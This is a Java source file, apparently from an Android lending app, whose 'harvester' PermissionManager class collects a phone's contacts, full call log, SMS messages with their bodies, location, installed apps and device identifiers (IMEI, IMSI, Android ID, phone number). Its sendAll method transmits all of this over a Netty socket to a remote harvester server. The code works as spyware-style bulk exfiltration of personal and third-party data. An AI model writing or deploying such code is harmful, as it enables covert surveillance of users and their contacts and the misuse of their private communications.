package com.daunkredit.program.sulu.harvester;

import android.Manifest;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import com.blankj.androidutilcode.service.DeviceUuidFactory;
import com.common.StringUtil;
import com.daunkredit.program.sulu.common.TokenManager;
import com.daunkredit.program.sulu.common.network.ServiceGenerator;
import com.daunkredit.program.sulu.common.utils.LoggerWrapper;
import com.daunkredit.program.sulu.harvester.def.ProtocolName;
import com.daunkredit.program.sulu.harvester.def.ProtocolVersion;
import com.orhanobut.logger.Logger;
import com.sulu.harvester.message.IncomeMessageProto;
import com.tbruyelle.rxpermissions.Permission;
import com.tbruyelle.rxpermissions.RxPermissions;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.Date;
import java.util.List;

import rx.Subscriber;
import rx.android.schedulers.AndroidSchedulers;
import rx.schedulers.Schedulers;

/**
 * Created by Miaoke on 14/04/2017.
 */

public class PermissionManager {

    private LocationManager locationManager;
    private String          locationProvider;

    public void fetchPersonInfo(final Activity mactivity, String... permissions) {
        RxPermissions rxPermissions = new RxPermissions(mactivity);

        rxPermissions.requestEach(
                permissions
        ).subscribeOn(AndroidSchedulers.mainThread())
                .observeOn(Schedulers.io())
                .subscribe(new Subscriber<Permission>() {
                    @Override
                    public void onCompleted() {

                    }

                    @Override
                    public void onError(Throwable e) {
                        Logger.d("Get x_trace failed.");
                    }

                    @Override
                    public void onNext(Permission permission) {
                        if (permission.name.equals(Manifest.permission.READ_CONTACTS)) {
                            if (permission.granted) {
                                HarvestInfoManager.getInstance().setContactStatus("0");
                                HarvestInfoManager.getInstance().setContactJsonobject(getContactInfo(mactivity));

                                updatePermissionState("READ_CONTACTS", true, mactivity);
                            } else {

                                mactivity.runOnUiThread(new Runnable() {
                                    @Override
                                    public void run() {
                                        Toast.makeText(mactivity, "Read contact info permission do not granted", Toast.LENGTH_SHORT).show();
                                    }
                                });

                                Logger.d("Read contact info permission do not granted");

                                updatePermissionState("READ_CONTACTS", false, mactivity);
                            }
                        } else if (permission.name.equals(Manifest.permission.READ_CALL_LOG)) {
                            if (permission.granted) {
                                HarvestInfoManager.getInstance().setCallLogsStatus("0");
                                HarvestInfoManager.getInstance().setCallLogsJsonobject(getCallLogs(mactivity));

                                updatePermissionState("READ_CALL_LOG", true, mactivity);
                            } else {
                                mactivity.runOnUiThread(new Runnable() {
                                    @Override
                                    public void run() {
                                        Toast.makeText(mactivity, "Read call logs permission do not granted", Toast.LENGTH_SHORT).show();
                                    }
                                });

                                Logger.d("Read call logs permission do not granted");

                                updatePermissionState("READ_CALL_LOG", false, mactivity);
                            }
                        } else if (permission.name.equals(Manifest.permission.READ_SMS)) {
                            if (permission.granted) {
                                HarvestInfoManager.getInstance().setSmsStatus("0");
                                HarvestInfoManager.getInstance().setSmsJsonobject(getSmsInfo(mactivity));

                                updatePermissionState("READ_SMS", true, mactivity);
                            } else {

                                mactivity.runOnUiThread(new Runnable() {
                                    @Override
                                    public void run() {
                                        Toast.makeText(mactivity, "Read SMS permission do not granted", Toast.LENGTH_SHORT).show();
                                    }
                                });


                                Logger.d("Read SMS permission do not granted");

                                updatePermissionState("READ_SMS", false, mactivity);
                            }
                        } else if (permission.name.equals(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                            if (permission.granted) {
                                HarvestInfoManager.getInstance().setLocationStatus("0");
                                HarvestInfoManager.getInstance().setLocationJsonobject(getLocationInfo(mactivity));
                                updatePermissionState("ACCESS_COARSE_LOCATION", true, mactivity);

                            } else {

                                mactivity.runOnUiThread(new Runnable() {
                                    @Override
                                    public void run() {
                                        Toast.makeText(mactivity, "Coarse permission do not granted", Toast.LENGTH_SHORT).show();
                                    }
                                });

                                Logger.d("Coarse Location permission do not granted");

                                updatePermissionState("ACCESS_COARSE_LOCATION", false, mactivity);
                            }
                        } else if (permission.name.equals(Manifest.permission.ACCESS_FINE_LOCATION)) {
                            if (permission.granted) {
                                HarvestInfoManager.getInstance().setLocationStatus("0");
                                HarvestInfoManager.getInstance().setLocationJsonobject(getLocationInfo(mactivity));
                                updatePermissionState("ACCESS_FINE_LOCATION", true, mactivity);
                            } else {

                                mactivity.runOnUiThread(new Runnable() {
                                    @Override
                                    public void run() {
                                        Toast.makeText(mactivity, "Fine location permission do not granted", Toast.LENGTH_SHORT).show();
                                    }
                                });

                                Logger.d("Fine Location permission do not granted");

                                updatePermissionState("ACCESS_FINE_LOCATION", false, mactivity);
                            }
                        } else if (permission.name.equals(Manifest.permission.READ_PHONE_STATE)) {
                            if (permission.granted) {
                                HarvestInfoManager.getInstance().setImeiKey(getImei(mactivity));
                                updatePermissionState("READ_PHONE_STATE", true, mactivity);
                            } else {

                                mactivity.runOnUiThread(new Runnable() {
                                    @Override
                                    public void run() {
                                        Toast.makeText(mactivity, "Read phone state permission do not granted", Toast.LENGTH_SHORT).show();
                                    }
                                });

                                Logger.d("Read phone state permission do not granted");
                                updatePermissionState("READ_PHONE_STATE", false, mactivity);
                            }
                        }
                    }
                });
    }


    private void updatePermissionState(String permission, Boolean isGranted, Activity mActivity) {
        HarvestInfoManager.getInstance().setPermissionStatus("0");
        HarvestInfoManager.getInstance().setPermissionJsonobject(updatePermission(permission, isGranted, mActivity));
    }

    /**
     * Get Contact info
     *
     * @param mactivity
     * @return
     */
    public static JSONObject getContactInfo(final Activity mactivity) {
        JSONObject contactsEntity = new JSONObject();
        Long totalNumber = 0L;
        Long latestTime = Long.MAX_VALUE;
        Long earliestTime = Long.MIN_VALUE;

        JSONArray contactArray = new JSONArray();

        ContentResolver contentResolver = mactivity.getContentResolver();
        if (contentResolver == null) {
            Logger.d("get contentResolver failed");

            return contactsEntity;
        }

        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        Cursor phoneCursor = null;
        Cursor emailCursor = null;

        while (cursor != null && cursor.moveToNext()) {
            JSONObject contact = new JSONObject();
            JSONArray phoneNumbers = new JSONArray();
            JSONArray emails = new JSONArray();
            String lastUpdateTime = null;
            String name = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));

            //get the phone number

            try {
                String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                phoneCursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId, null, null);
                emailCursor = contentResolver.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId, null, null);
                if (Build.VERSION.SDK_INT >= 18) {
                    lastUpdateTime = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP));
                }
            } catch (IllegalArgumentException ex) {
                Logger.d("Get the cursor failed. " + ex.getMessage());
            } catch (Exception ex) {
                Logger.d("Get the cursor failed. " + ex.getMessage());
            }

            while (phoneCursor != null && phoneCursor.moveToNext()) {
                String number = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                if (!StringUtil.isNullOrEmpty(number)) {
                    number = number.replace("-", "");
                    number = number.replace(" ", "");
                }
                phoneNumbers.put(number);
            }

            while (emailCursor != null && emailCursor.moveToNext()) {
                String email = emailCursor.getString(emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                emails.put(email);
            }

            try {
                if (phoneNumbers.length() == 0)
                    continue;

                totalNumber++;
                if (lastUpdateTime != null) {
                    latestTime = Math.min(latestTime, Long.parseLong(lastUpdateTime));
                    earliestTime = Math.max(earliestTime, Long.parseLong(lastUpdateTime));
                }

                contact.put("name", name);
                contact.put("number", phoneNumbers);
                contact.put("email", emails);
                //                contact.put("lastUpdate", new SimpleDateFormat("yyyy-MM-dd").format(new Date(Long.parseLong(lastUpdateTime))));
                contact.put("lastUpdate", lastUpdateTime);
                contactArray.put(contact);
            } catch (JSONException ex) {
                Logger.d("JSONException: " + ex.getMessage());
                ex.printStackTrace();

            }
        }

        if (cursor != null) {
            cursor.close();
        }

        if (phoneCursor != null) {
            phoneCursor.close();
        }
        if (emailCursor != null) {
            emailCursor.close();
        }

        try {
            PackageInfo packageInfo = mactivity.getPackageManager().getPackageInfo(mactivity.getPackageName(), 0);
            contactsEntity.put("protocolName", ProtocolName.CONTACT);
            contactsEntity.put("protocolVersion", ProtocolVersion.V_1_0);
            contactsEntity.put("versionName", packageInfo.versionName);

            contactsEntity.put("totalNumber", totalNumber);
            contactsEntity.put("latestTime", latestTime);
            contactsEntity.put("earliestTime", earliestTime);
            contactsEntity.put("data", contactArray);
        } catch (JSONException ex) {
            Logger.d("JSONException: " + ex.getMessage());
            ex.printStackTrace();
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }

        Logger.d(contactsEntity);
        return contactsEntity;
    }

    /**
     * Get the Call Logs
     *
     * @param mActivity
     * @return
     */
    public static JSONObject getCallLogs(Activity mActivity) {

        JSONObject callLogsEntity = new JSONObject();
        Long totalNumber = 0L;
        Long latestTime = Long.MAX_VALUE;
        Long earliestTime = Long.MIN_VALUE;

        JSONArray callLogsArray = new JSONArray();
        ContentResolver contentResolver = mActivity.getContentResolver();
        if (contentResolver == null) {
            return callLogsEntity;
        }

        /**
         * CallLog.Calls.TYPE
         * INCOMING_TYPE = 1
         * OUTGOING_TYPE = 2
         * MISSED_TYPE = 3
         * VOICEMAIL_TYPE = 4
         * REJECTED_TYPE = 5
         * BLOCKED_TYPE = 6
         * ANSWERED_EXTERNALLY_TYPE = 7
         */
        if (ContextCompat.checkSelfPermission(mActivity, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            Cursor cursor = contentResolver.query(CallLog.Calls.CONTENT_URI,
                    new String[]{CallLog.Calls.CACHED_NAME,
                            CallLog.Calls.NUMBER,
                            CallLog.Calls.TYPE,
                            CallLog.Calls.DATE,
                            CallLog.Calls.DURATION},
                    null, null, CallLog.Calls.DEFAULT_SORT_ORDER);

            while (cursor != null && cursor.moveToNext()) {
                JSONObject callLog = new JSONObject();

                try {
                    totalNumber++;
                    latestTime = Math.min(latestTime, Long.parseLong(cursor.getString(3)));
                    earliestTime = Math.max(earliestTime, Long.parseLong(cursor.getString(3)));
                    callLog.put("name", cursor.getString(0));
                    callLog.put("number", cursor.getString(1));
                    callLog.put("direction", cursor.getString(2));
                    callLog.put("createTime", cursor.getString(3));
                    callLog.put("duration", cursor.getString(4));
                    callLogsArray.put(callLog);
                } catch (JSONException ex) {
                    Logger.d("JSONException: " + ex.getMessage());
                    ex.printStackTrace();
                }
            }

            if (cursor != null) {
                cursor.close();
            }

            try {
                PackageInfo packageInfo = mActivity.getPackageManager().getPackageInfo(mActivity.getPackageName(), 0);
                callLogsEntity.put("protocolName", ProtocolName.CALL_LOG);
                callLogsEntity.put("protocolVersion", ProtocolVersion.V_1_0);
                callLogsEntity.put("versionName", packageInfo.versionName);

                callLogsEntity.put("totalNumber", totalNumber);
                callLogsEntity.put("latestTime", latestTime);
                callLogsEntity.put("earliestTime", earliestTime);
                callLogsEntity.put("data", callLogsArray);
            } catch (JSONException ex) {
                Logger.d("JSONException: " + ex.getMessage());
                ex.printStackTrace();
            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();
                Logger.d("PackageManager.NameNotFoundException: " + e.getMessage());
            }


        } else {
            Logger.d("Call logs permission deny");
        }

        Logger.d(callLogsEntity);
        return callLogsEntity;

    }

    /**
     * Get the SMS Info
     * <p>
     * 1 receive 2 send
     */
    protected JSONObject getSmsInfo(Activity mActivity) {
        JSONObject phoneSmsEntity = new JSONObject();
        Long totalNumber = 0L;
        Long latestTime = Long.MIN_VALUE;
        Long earliestTime = Long.MAX_VALUE;

        JSONArray phoneSmsArray = new JSONArray();
        JSONObject phoneSms;

        String name;
        String number;
        String direction;
        Long createTime;
        String content;

        ContentResolver contentResolver = mActivity.getContentResolver();
        if (contentResolver == null) {
            return phoneSmsEntity;
        }

        Cursor cursor = contentResolver.query(Uri.parse("content://sms"), new String[]{"person", "address", "type", "date", "body"}, null, null, null);

        while (cursor != null && cursor.moveToNext()) {
            try {
                name = cursor.getString(0);
                number = cursor.getString(1);
                direction = cursor.getString(2);
                createTime = cursor.getLong(3);
                content = cursor.getString(4);

                phoneSms = new JSONObject();
                totalNumber++;
                latestTime = Math.max(latestTime, createTime);
                earliestTime = Math.min(earliestTime, createTime);
                phoneSms.put("name", name);
                phoneSms.put("number", number);
                phoneSms.put("direction", direction);
                phoneSms.put("createTime", createTime);
                phoneSms.put("content", content);
                phoneSmsArray.put(phoneSms);
            } catch (JSONException ex) {
                Logger.d("JSONException: " + ex.getMessage());
                ex.printStackTrace();
            }
        }

        if (cursor != null) {
            cursor.close();
        }

        try {
            PackageInfo packageInfo = mActivity.getPackageManager().getPackageInfo(mActivity.getPackageName(), 0);

            phoneSmsEntity.put("protocolName", ProtocolName.SMS_LOG);
            phoneSmsEntity.put("protocolVersion", ProtocolVersion.V_1_0);
            phoneSmsEntity.put("versionName", packageInfo.versionName);

            phoneSmsEntity.put("totalNumber", totalNumber);
            phoneSmsEntity.put("latestTime", latestTime);
            phoneSmsEntity.put("earliestTime", earliestTime);
            phoneSmsEntity.put("data", phoneSmsArray);
        } catch (JSONException e) {
            e.printStackTrace();
            Logger.d("JSONException: " + e.getMessage());
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            Logger.d("PackageManager.NameNotFoundException: " + e.getMessage());
        }

        Logger.d(phoneSmsEntity);
        return phoneSmsEntity;
    }


    protected JSONObject getLocationInfo(final Activity mActivity) {
        Logger.d("getLocationInfo function    <----------");

        JSONObject locationEntity = new JSONObject();

        Long totalNumber = 1L;

        JSONArray locationArray = new JSONArray();
        final JSONObject location = new JSONObject();
        locationManager = (LocationManager) mActivity.getSystemService(mActivity.LOCATION_SERVICE);

        if (ActivityCompat.checkSelfPermission(mActivity, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(mActivity, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Logger.d("Permission do not granted.");
        } else {
            Location locationObject = null;
            List<String> providers = locationManager.getProviders(true);

            if (locationObject == null && providers.contains(LocationManager.GPS_PROVIDER)) {
                locationProvider = LocationManager.GPS_PROVIDER;
                locationObject = locationManager.getLastKnownLocation(locationProvider);
                Logger.d("Get GPS Provider");
            }

            if (locationObject == null && providers.contains(LocationManager.NETWORK_PROVIDER)) {
                locationProvider = LocationManager.NETWORK_PROVIDER;
                locationObject = locationManager.getLastKnownLocation(locationProvider);
                Logger.d("Get network provider");
            }

            if (locationObject == null && providers.contains(LocationManager.PASSIVE_PROVIDER)) {
                locationProvider = LocationManager.PASSIVE_PROVIDER;
                locationObject = locationManager.getLastKnownLocation(locationProvider);
                Logger.d("PASSIVE_PROVIDER location provider.");
            }

            if (locationObject != null) {
                try {
                    location.put("latitude", locationObject.getLatitude());
                    location.put("longitude", locationObject.getLongitude());
                    location.put("altitude", locationObject.getAltitude());
                    location.put("createTime", locationObject.getTime());
                    locationArray.put(location);
                    Logger.d("get location: " + location);
                } catch (JSONException e) {
                    e.printStackTrace();
                    Logger.d("JSONException: " + e.getMessage());
                }
            } else {
                Logger.d("locationObject is null");
            }
        }

        try {
            PackageInfo packageInfo = mActivity.getPackageManager().getPackageInfo(mActivity.getPackageName(), 0);

            locationEntity.put("protocolName", ProtocolName.LOCATION);
            locationEntity.put("protocolVersion", ProtocolVersion.V_1_0);
            locationEntity.put("versionName", packageInfo.versionName);

            locationEntity.put("totalNumber", totalNumber);
            locationEntity.put("latestTime", System.currentTimeMillis());
            locationEntity.put("earliestTime", 0);
            locationEntity.put("data", locationArray);
        } catch (JSONException ex) {
            Logger.d("JSONException: " + ex.getMessage());
            ex.printStackTrace();
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            Logger.d("PackageManager.NameNotFoundException: " + e.getMessage());
        }
        Logger.d(locationEntity);

        return locationEntity;
    }

    protected JSONObject updatePermission(String permissionType, Boolean isGranted, Activity mActivity) {
        JSONObject permission = new JSONObject();
        try {
            permission.put("permissionType", permissionType);
            permission.put("isGranted", isGranted);
            permission.put("createTime", new Date().getTime());
        } catch (JSONException e) {
            e.printStackTrace();
            Logger.d("JSONException: " + e.getMessage());
        }

        if (HarvestInfoManager.getInstance().hasPermissionInfo()) {
            JSONObject permissionEntity = HarvestInfoManager.getInstance().getPermissionJsonobject();

            try {
                permissionEntity.put("totalNumber", Integer.parseInt(permissionEntity.getString("totalNumber")) + 1);
                permissionEntity.getJSONArray("data").put(permission);
            } catch (JSONException e) {
                e.printStackTrace();
                Logger.d("JSONException: " + e.getMessage());
            }

            return permissionEntity;
        } else {
            JSONObject permissionEntity = new JSONObject();

            Long totalNumber = 1L;
            Long latestTime = 0L;
            Long earliestTime = 0L;

            JSONArray permissionArray = new JSONArray();
            JSONObject permissionObject;
            permissionObject = permission;
            permissionArray.put(permission);
            Logger.d("Add permission info: " + permissionObject);

            try {
                PackageInfo packageInfo = mActivity.getPackageManager().getPackageInfo(mActivity.getPackageName(), 0);

                permissionEntity.put("protocolName", ProtocolName.PERMISSION);
                permissionEntity.put("protocolVersion", ProtocolVersion.V_1_0);
                permissionEntity.put("versionName", packageInfo.versionName);

                permissionEntity.put("totalNumber", totalNumber);
                permissionEntity.put("latestTime", latestTime);
                permissionEntity.put("earliestTime", earliestTime);

                permissionEntity.put("data", permissionArray);
            } catch (JSONException e) {
                e.printStackTrace();
                Logger.d("JSONException: " + e.getMessage());
            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();
                Logger.d("PackageManager.NameNotFoundException: " + e.getMessage());
            }

            return permissionEntity;
        }
    }


    /**
     * Get the installed Apps info
     *
     * @param mActivity
     * @return
     */
    public static JSONObject getInstallApp(Activity mActivity) {
        Logger.d("begin get install app->");

        JSONObject installAppEntity = new JSONObject();
        Long totalNumber = 0L;
        Long latestTime = 0L;
        Long earliestTime = 0L;

        JSONArray installAppArray = new JSONArray();
        List<PackageInfo> packageInfoList = mActivity.getPackageManager().getInstalledPackages(0);

        for (PackageInfo packageInfo : packageInfoList) {
            JSONObject appInfo = new JSONObject();
            try {
                totalNumber++;
                appInfo.put("appName", packageInfo.applicationInfo.loadLabel(mActivity.getPackageManager()).toString());
                appInfo.put("packageName", packageInfo.packageName);
                appInfo.put("versionName", packageInfo.versionName);
                appInfo.put("versionCode", packageInfo.versionCode);
                installAppArray.put(appInfo);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }

        try {
            PackageInfo packageInfo = mActivity.getPackageManager().getPackageInfo(mActivity.getPackageName(), 0);
            installAppEntity.put("protocolName", ProtocolName.INSTALLED_APP);
            installAppEntity.put("protocolVersion", ProtocolVersion.V_1_0);
            installAppEntity.put("versionName", packageInfo.versionName);

            installAppEntity.put("totalNumber", totalNumber);
            installAppEntity.put("latestTime", latestTime);
            installAppEntity.put("earliestTime", earliestTime);
            installAppEntity.put("data", installAppArray);
        } catch (JSONException ex) {
            Logger.d("JSONException: " + ex.getMessage());
            ex.printStackTrace();
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            Logger.d("PackageManager.NameNotFoundException: " + e.getMessage());
        }

        return installAppEntity;

    }

    /**
     * Get the machine type
     *
     * @param mActivity
     * @return
     */
    public static JSONObject getMachineType(Activity mActivity) {
        Logger.d("begin get machine type ->");

        JSONObject machineTypeEntity = new JSONObject();
        Long totalNumber = 1L;
        Long latestTime = 0L;
        Long earliestTime = 0L;

        JSONArray machineTypeArray = new JSONArray();

        JSONObject machineType = new JSONObject();
        try {
            machineType.put("deviceBrand", Build.BRAND);
            machineType.put("deviceType", Build.MODEL);
            machineType.put("systemVersion", Build.VERSION.RELEASE);
            machineTypeArray.put(machineType);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        try {
            PackageInfo packageInfo = mActivity.getPackageManager().getPackageInfo(mActivity.getPackageName(), 0);
            machineTypeEntity.put("protocolName", ProtocolName.MACHINE_TYPE);
            machineTypeEntity.put("protocolVersion", ProtocolVersion.V_1_0);
            machineTypeEntity.put("versionName", packageInfo.versionName);

            machineTypeEntity.put("totalNumber", totalNumber);
            machineTypeEntity.put("latestTime", latestTime);
            machineTypeEntity.put("earliestTime", earliestTime);
            machineTypeEntity.put("data", machineTypeArray);
        } catch (JSONException ex) {
            Logger.d("JSONException: " + ex.getMessage());
            ex.printStackTrace();
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            Logger.d("PackageManager.NameNotFoundException: " + e.getMessage());
        }

        Logger.d(machineTypeEntity);
        return machineTypeEntity;
    }


    /**
     * get the imei
     *
     * @return
     */
    private static String getImei(Context context) {
        TelephonyManager tm = (TelephonyManager) context.getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);

        String imei;
        String imsi;
        try {
            imei = tm.getDeviceId();
            imsi = tm.getSubscriberId();

        } catch (SecurityException e) {
            Logger.d("SecurityException: " + e.getMessage());
            imei = "no_phone_state_permission";
            imsi = "no_phone_state_permission";
        }

        String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        String uuid = new DeviceUuidFactory(context).getDeviceUuid().toString();
        Logger.d("Imei: " + imei + "_" + imsi + "_" + androidId + "_" + uuid);
        return imei + "_" + imsi + "_" + androidId + "_" + uuid;
    }


    /**
     * Send to serverF
     *
     * @param context
     * @param host
     * @param jsonObject
     */
    public static void formSend(Context context, String host, JSONObject jsonObject) {

        try {
            NettyClient nettyClient = NettyClient.Holder.getNettyClient();
            nettyClient.initStart(host, 9696);

            IncomeMessageProto.Message.Builder builder = IncomeMessageProto.Message.newBuilder();
            builder.setImei(getImei(context));
            if (TokenManager.getInstance().getMobile() != null) {
                builder.setMobile(TokenManager.getInstance().getMobile());
            } else {
                TelephonyManager tm = (TelephonyManager) context.getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
                String line1Number = tm.getLine1Number();
                if (line1Number != null && !"10081".equals(line1Number)) {
                    builder.setMobile(line1Number);
                } else {
                    builder.setMobile("000000");
                }
            }
            builder.setCTimestamp(System.currentTimeMillis());
            builder.setType(IncomeMessageProto.Message.Type.TRACE);
            builder.setBody(jsonObject.toString());
            LoggerWrapper.e("imei:" + builder.getImei() + "\nmobile:" + builder.getMobile()
            + "\nbody:" + builder.getBody());
            nettyClient.send(builder.build());
        } catch (Exception e) {
            e.printStackTrace();
            Logger.d("nettyClient send failed; " + e);
        }
    }

    public void sendAll(Activity mActivity) {

        if (HarvestInfoManager.getInstance().hasContact() && "0".equals(HarvestInfoManager.getInstance().getContactStatus())) {
            formSend(mActivity, ServiceGenerator.HARVESTER_URL, HarvestInfoManager.getInstance().getContactJsonobject());
        }

        if (HarvestInfoManager.getInstance().hasCallLogs() && "0".equals(HarvestInfoManager.getInstance().getCallLogsStatus())) {
            formSend(mActivity, ServiceGenerator.HARVESTER_URL, HarvestInfoManager.getInstance().getCallLogsJsonobject());
        }

        if (HarvestInfoManager.getInstance().hasCallLogs() && "0".equals(HarvestInfoManager.getInstance().getCallLogsStatus())) {
            formSend(mActivity, ServiceGenerator.HARVESTER_URL, HarvestInfoManager.getInstance().getCallLogsJsonobject());
        }

        if (HarvestInfoManager.getInstance().hasSms() && "0".equals(HarvestInfoManager.getInstance().getSmsStatus())) {
            formSend(mActivity, ServiceGenerator.HARVESTER_URL, HarvestInfoManager.getInstance().getSmsJsonobject());
        }

        if (HarvestInfoManager.getInstance().hasLocation() && "0".equals(HarvestInfoManager.getInstance().getLocationStatus())) {
            Logger.d("Begin to send location info");
            formSend(mActivity, ServiceGenerator.HARVESTER_URL, HarvestInfoManager.getInstance().getLocationJsonobject());
        }

        if (HarvestInfoManager.getInstance().hasPermissionInfo() && "0".equals(HarvestInfoManager.getInstance().getPermissionStatus())) {
            Logger.d("Begin to send permission info");
            formSend(mActivity, ServiceGenerator.HARVESTER_URL, HarvestInfoManager.getInstance().getPermissionJsonobject());
        }

        if (HarvestInfoManager.getInstance().hasInstallAppInfo() && "0".equals(HarvestInfoManager.getInstance().getInstallAppStatus())) {
            Logger.d("Begin to send install apps info");
            formSend(mActivity, ServiceGenerator.HARVESTER_URL, HarvestInfoManager.getInstance().getInstallAppJsonobject());
        }

        if (HarvestInfoManager.getInstance().hasMachineType() && "0".equals(HarvestInfoManager.getInstance().getMachineTypeStatus())) {
            Logger.d("Begin to send machine type");
            formSend(mActivity, ServiceGenerator.HARVESTER_URL, HarvestInfoManager.getInstance().getMachineTypeJsonobject());

        }
    }
}
